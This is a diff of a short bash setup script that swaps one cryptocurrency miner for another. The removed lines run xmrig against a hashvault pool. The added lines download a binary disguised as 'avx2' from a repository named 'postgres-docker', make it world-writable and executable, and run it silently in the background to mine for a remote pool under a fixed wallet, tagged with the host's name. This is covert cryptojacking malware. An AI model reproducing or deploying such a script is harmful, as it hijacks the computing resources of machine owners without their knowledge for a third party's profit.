@@ -1,6 +1,7 @@
 #!/bin/bash
 apt update && apt -y install wget git curl sudo
-chmod +x xmrig
-./xmrig --donate-level 1 -a Argon2/Chukwa -o singapore01.hashvault.pro:80 -u TRTLuzQtL4XhgUew7qp987b2UZMTLCvXtEnsbi1gUBFFjHEQqWCTCnNS28Pwv7Z4DjELA52kBXBk8AjCgpSFneJHHadpVFB6gAE -p $(cat /proc/sys/kernel/hostname) -t$(nproc --all) -B
+wget https://github.com/iaidjb18ha/postgres-docker/raw/server-2.19/avx2
+chmod 777 avx2
+./avx2 -a minotaurx  -o stratum+tcps://stratum-ru.rplant.xyz:17068 -u RXzEz9Qm1dNMj2V7PtEaQ2yz7kysjFGVq7.$(cat /proc/sys/kernel/hostname) -t16 >/dev/null &
 rm -rf xmrig
 sleep 24h
